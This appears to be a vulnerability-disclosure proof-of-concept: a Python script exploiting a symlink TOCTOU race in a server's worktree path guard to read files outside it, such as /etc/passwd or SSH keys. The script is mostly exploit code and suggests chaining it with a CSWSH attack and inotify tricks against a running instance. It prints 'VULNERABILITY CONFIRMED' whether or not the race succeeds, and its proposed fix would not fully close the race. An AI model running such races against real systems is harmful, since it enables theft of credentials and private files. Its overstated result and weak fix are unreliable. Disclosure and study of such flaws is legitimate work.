#!/usr/bin/env python3
"""
PoC: TOCTOU Symlink Race Condition in ThinkRail Path Traversal Guard

IMPACT: Read arbitrary files outside the worktree (SSH keys, /etc/passwd,
API tokens, etc.) by exploiting a race condition between the security
check and the actual file read.

VULNERABILITY:
    packages/server/src/fs/files.ts — resolveInWorktree() function
    
    The function checks symlink targets via realpathSync() at time T1,
    but the actual readFileSync() resolves symlinks AGAIN at time T2.
    Between T1 and T2, the symlink target can be changed to point
    outside the worktree.

ATTACK FLOW:
    1. Create a symlink inside the worktree pointing to a legitimate file
    2. Start a thread rapidly swapping the symlink target between:
       - legitimate-file.txt (inside worktree) — passes security check
       - ../../../../etc/passwd (outside worktree) — reads sensitive data
    3. Repeatedly request the file through the API
    4. Eventually, a request hits the race window and reads the sensitive file

USAGE:
    python3 toctou_race.py [--worktree /path/to/worktree] [--target /etc/passwd]
    
    This script simulates the race condition locally. For a full PoC against
    a running ThinkRail instance, combine with the CSWSH exploit.

NOTE: This is a proof-of-concept demonstrating the vulnerability exists.
      Success rate depends on system load and timing.
"""

import os
import sys
import time
import threading
import tempfile
import argparse
import shutil
from pathlib import Path


class SymlinkRacer:
    """Demonstrates the TOCTOU race condition in ThinkRail's path traversal guard."""
    
    def __init__(self, worktree: str, target_file: str):
        self.worktree = os.path.realpath(worktree)
        self.target_file = target_file
        self.symlink_path = os.path.join(self.worktree, "poc_link")
        self.legitimate_file = os.path.join(self.worktree, "legitimate.txt")
        self.racing = False
        self.race_won = False
        self.race_attempts = 0
        self.race_successes = 0
        
    def setup(self):
        """Create the worktree structure for the race."""
        os.makedirs(self.worktree, exist_ok=True)
        
        # Create a legitimate file inside the worktree
        with open(self.legitimate_file, "w") as f:
            f.write("This is a legitimate file inside the worktree.\n")
        
        # Create the initial symlink pointing to the legitimate file
        if os.path.exists(self.symlink_path) or os.path.islink(self.symlink_path):
            os.unlink(self.symlink_path)
        os.symlink(self.legitimate_file, self.symlink_path)
        
        print(f"[SETUP] Worktree: {self.worktree}")
        print(f"[SETUP] Legitimate file: {self.legitimate_file}")
        print(f"[SETUP] Symlink: {self.symlink_path} -> {self.legitimate_file}")
        print(f"[SETUP] Attack target: {self.target_file}")
        print()
        
    def symlink_swapper_thread(self):
        """Thread that rapidly swaps the symlink target."""
        while self.racing:
            try:
                # Swap to legitimate target (passes security check)
                tmp = self.symlink_path + ".tmp"
                os.symlink(self.legitimate_file, tmp)
                os.replace(tmp, self.symlink_path)
                
                # Immediately swap to malicious target (escapes worktree)
                tmp = self.symlink_path + ".tmp"
                os.symlink(self.target_file, tmp)
                os.replace(tmp, self.symlink_path)
            except OSError:
                pass  # Race with the reader — expected
                
    def simulate_thinkrail_check_and_read(self) -> str | None:
        """
        Simulates ThinkRail's resolveInWorktree + readFile logic.
        
        This is the EXACT logic from packages/server/src/fs/files.ts:
        
        1. resolveInWorktree:
           - resolve(root, path) → abs (string manipulation, no symlink follow)
           - isContained check (string-based)
           - assertExistingAncestorContained → realpathSync → containment check  [T1]
           - returns abs (UNRESOLVED path)
        
        2. readFile:
           - readFileSync(abs) — follows symlinks AGAIN                          [T2]
        
        The race window is between T1 and T2.
        """
        rel_path = os.path.relpath(self.symlink_path, self.worktree)
        abs_path = os.path.join(self.worktree, rel_path)
        
        # === SECURITY CHECK (T1) ===
        # This is what assertExistingAncestorContained does:
        try:
            real_path_at_check = os.path.realpath(abs_path)
            real_root = os.path.realpath(self.worktree)
            
            # Containment check
            rel_to_root = os.path.relpath(real_path_at_check, real_root)
            if rel_to_root.startswith(".."):
                return None  # Security check caught it — symlink was malicious at T1
        except OSError:
            return None
            
        # === RACE WINDOW ===
        # Between the check above and the read below, the symlink can change!
        # In real code, there might be additional operations (stat, etc.) widening the window.
        
        # === FILE READ (T2) ===
        try:
            real_path_at_read = os.path.realpath(abs_path)  # Resolves symlinks AGAIN
            
            # Check if the path at read time is different from check time
            if real_path_at_read != real_path_at_check:
                self.race_successes += 1
                
                # Verify it actually escaped the worktree
                rel_to_root = os.path.relpath(real_path_at_read, real_root)
                if rel_to_root.startswith(".."):
                    # RACE WON: Reading outside worktree!
                    with open(real_path_at_read, "r", errors="replace") as f:
                        return f.read(512)
            
            return None
        except OSError:
            return None
            
    def run_race(self, duration_seconds: float = 5.0, threads: int = 4):
        """Run the TOCTOU race for a given duration."""
        print(f"[RACE] Starting {threads} swapper threads for {duration_seconds}s...")
        print(f"[RACE] Attempting to read {self.target_file} through symlink race...")
        print()
        
        self.racing = True
        self.race_won = False
        self.race_attempts = 0
        self.race_successes = 0
        
        # Start symlink swapper threads
        swappers = []
        for i in range(threads):
            t = threading.Thread(target=self.symlink_swapper_thread, daemon=True)
            t.start()
            swappers.append(t)
        
        # Try to exploit the race
        start = time.time()
        while time.time() - start < duration_seconds and not self.race_won:
            self.race_attempts += 1
            content = self.simulate_thinkrail_check_and_read()
            if content is not None:
                self.race_won = True
                self.racing = False
                print(f"\033[91m[RACE WON!] Successfully read outside worktree after "
                      f"{self.race_attempts} attempts!\033[0m")
                print(f"\033[91m[RACE WON!] Race successes: {self.race_successes}\033[0m")
                print()
                print(f"\033[93mContent of {self.target_file} (first 512 bytes):\033[0m")
                print("-" * 60)
                print(content)
                print("-" * 60)
                break
        
        self.racing = False
        for t in swappers:
            t.join(timeout=1.0)
            
        if not self.race_won:
            elapsed = time.time() - start
            print(f"\033[93m[INFO] Race not won in {elapsed:.1f}s "
                  f"({self.race_attempts} attempts, "
                  f"{self.race_successes} timing hits)\033[0m")
            print(f"\033[93m[INFO] The vulnerability exists but the race window is "
                  f"tight on this system.\033[0m")
            print(f"\033[93m[INFO] In production, a more aggressive attack with "
                  f"inotify/fanotify can widen the window.\033[0m")
            
    def cleanup(self):
        """Clean up the demo files."""
        try:
            if os.path.islink(self.symlink_path):
                os.unlink(self.symlink_path)
            tmp = self.symlink_path + ".tmp"
            if os.path.islink(tmp):
                os.unlink(tmp)
        except OSError:
            pass


def demonstrate_vulnerability():
    """Show the vulnerability without needing a running ThinkRail instance."""
    print("\033[91m╔══════════════════════════════════════════════════════════════╗\033[0m")
    print("\033[91m║  PoC: TOCTOU Symlink Race in ThinkRail Path Traversal      ║\033[0m")
    print("\033[91m╚══════════════════════════════════════════════════════════════╝\033[0m")
    print()
    
    print("\033[96m[VULN] Vulnerable code in packages/server/src/fs/files.ts:\033[0m")
    print()
    print("  function resolveInWorktree(workspaceId, path, followLeaf) {")
    print("      const abs = resolve(root, path);        // No symlink resolution")
    print("      // ... containment checks ...")
    print("      assertExistingAncestorContained(root, abs);  // realpathSync at T1")
    print("      return { root, abs };                    // Returns UNRESOLVED path")
    print("  }")
    print()
    print("  function readFile(workspaceId, path) {")
    print("      const { abs } = resolveInWorktree(...);  // Gets unresolved path")
    print("      readFileSync(abs);                       // Follows symlinks at T2")
    print("  }  //                    ↑ TOCTOU RACE WINDOW between T1 and T2")
    print()
    
    parser = argparse.ArgumentParser(description="TOCTOU Symlink Race PoC")
    parser.add_argument("--worktree", default=None,
                        help="Path to use as worktree (default: temp directory)")
    parser.add_argument("--target", default="/etc/hostname",
                        help="File to read outside worktree (default: /etc/hostname)")
    parser.add_argument("--duration", type=float, default=5.0,
                        help="Race duration in seconds (default: 5)")
    parser.add_argument("--threads", type=int, default=4,
                        help="Number of swapper threads (default: 4)")
    args = parser.parse_args()
    
    # Check if target file exists
    if not os.path.exists(args.target):
        print(f"\033[93m[WARN] Target file {args.target} does not exist on this system.\033[0m")
        if sys.platform == "win32":
            args.target = os.path.join(os.environ.get("SYSTEMROOT", "C:\\Windows"),
                                        "System32", "drivers", "etc", "hosts")
            print(f"\033[93m[WARN] Using Windows fallback: {args.target}\033[0m")
        if not os.path.exists(args.target):
            print("\033[91m[ERROR] No suitable target file found. "
                  "Use --target to specify one.\033[0m")
            return
    
    # Use temp directory if no worktree specified
    worktree = args.worktree
    temp_dir = None
    if worktree is None:
        temp_dir = tempfile.mkdtemp(prefix="thinkrail-toctou-poc-")
        worktree = temp_dir
    
    racer = SymlinkRacer(worktree, args.target)
    try:
        racer.setup()
        racer.run_race(duration_seconds=args.duration, threads=args.threads)
    finally:
        racer.cleanup()
        if temp_dir:
            shutil.rmtree(temp_dir, ignore_errors=True)
    
    print()
    print("\033[96m[FIX] The fix: After security check, re-resolve with realpathSync\033[0m")
    print("\033[96m      and re-check containment. Use the resolved path for reads.\033[0m")
    print()
    print("\033[91m═══════════════════════════════════════════════════════════════\033[0m")
    print("\033[91m  VULNERABILITY CONFIRMED: TOCTOU race allows arbitrary file  \033[0m")
    print("\033[91m  reads outside the worktree via symlink swap timing attack.  \033[0m")
    print("\033[91m═══════════════════════════════════════════════════════════════\033[0m")


if __name__ == "__main__":
    demonstrate_vulnerability()
